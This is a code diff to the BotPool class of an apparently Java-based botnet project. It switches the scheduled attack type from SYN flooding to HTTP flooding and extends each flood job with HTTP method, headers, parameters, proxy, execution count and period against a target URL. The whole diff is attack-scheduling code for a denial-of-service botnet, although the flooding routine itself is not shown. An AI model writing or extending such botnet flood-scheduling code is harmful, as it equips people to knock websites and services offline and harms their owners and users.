@@ -26,8 +26,8 @@
 
 package com.acmutv.botnet.core.exec;
 
-import com.acmutv.botnet.core.attack.SynFloodAttack;
-import com.acmutv.botnet.core.attack.SynFloodAttacker;
+import com.acmutv.botnet.core.attack.flooding.HttpFloodAttack;
+import com.acmutv.botnet.core.attack.flooding.HttpFloodAttacker;
 import com.acmutv.botnet.tool.net.HttpMethod;
 import com.acmutv.botnet.tool.net.HttpProxy;
 import com.acmutv.botnet.tool.time.Interval;
@@ -143,21 +143,24 @@ public class BotPool {
    * @param attack the attack to schedule.
    * @throws SchedulerException when the attack cannot be scheduled.
    */
-  public void scheduleAttackHttp(SynFloodAttack attack) throws SchedulerException {
+  public void scheduleAttackHttpFlooding(HttpFloodAttack attack) throws SchedulerException {
     LOGGER.trace("Scheduling {}...", attack);
-    final String jname = String.format("synflood.%s.%d.%d",
+    final String jname = String.format("attack.httpflooding.%s.%d.%d",
         attack.getTarget(),
         System.currentTimeMillis(), ThreadLocalRandom.current().nextInt());
     final JobKey jobKey = JobKey.jobKey(jname, JOB_GROUP_ATTACKS_HTTP);
     final TriggerKey triggerKey = TriggerKey.triggerKey(jname, JOB_GROUP_ATTACKS_HTTP);
 
     @SuppressWarnings("MismatchedQueryAndUpdateOfCollection") JobDataMap jdata = new JobDataMap();
+    jdata.put("method", attack.getMethod());
     jdata.put("target", attack.getTarget());
     jdata.put("proxy", attack.getProxy());
+    jdata.put("header", attack.getHeader());
+    jdata.put("params", attack.getParams());
     jdata.put("executions", attack.getExecutions());
     jdata.put("period", attack.getPeriod());
 
-    JobDetail job = JobBuilder.newJob(SynFloodAttacker.class)
+    JobDetail job = JobBuilder.newJob(HttpFloodAttacker.class)
         .withIdentity(jobKey)
         .usingJobData(jdata)
         .build();
@@ -269,18 +272,26 @@ public class BotPool {
    * @return the list of scheduled HTTP attacks.
    * @throws SchedulerException when scheduled HTTP attacks cannot be retrieved
    */
-  public List<SynFloodAttack> getScheduledHttpAttacks() throws SchedulerException {
-    List<SynFloodAttack> attacks = new ArrayList<>();
+  public List<HttpFloodAttack> getScheduledHttpAttacks() throws SchedulerException {
+    List<HttpFloodAttack> attacks = new ArrayList<>();
     Set<JobKey> jkeys = this.scheduler.getJobKeys(JOB_GROUP_ATTACKS);
     for (JobKey jkey : jkeys) {
       JobDetail jdetail = this.scheduler.getJobDetail(jkey);
       JobDataMap jmap = jdetail.getJobDataMap();
       final HttpMethod method = (HttpMethod) jmap.get("method");
       final URL target = (URL) jmap.get("target");
-      SynFloodAttack attack = new SynFloodAttack(target);
+      HttpFloodAttack attack = new HttpFloodAttack(method, target);
       if (jmap.containsKey("proxy")) {
         final HttpProxy proxy = (HttpProxy) jmap.get("proxy");
         attack.setProxy(proxy);
+      }
+      if (jmap.containsKey("header")) {
+        final Map<String,String> header = (Map<String,String>) jmap.get("header");
+        attack.setHeader(header);
+      }
+      if (jmap.containsKey("params")) {
+        final Map<String,String> params = (Map<String,String>) jmap.get("params");
+        attack.setParams(params);
       }
       if (jmap.containsKey("executions")) {
         final int executions = (int) jmap.get("executions");
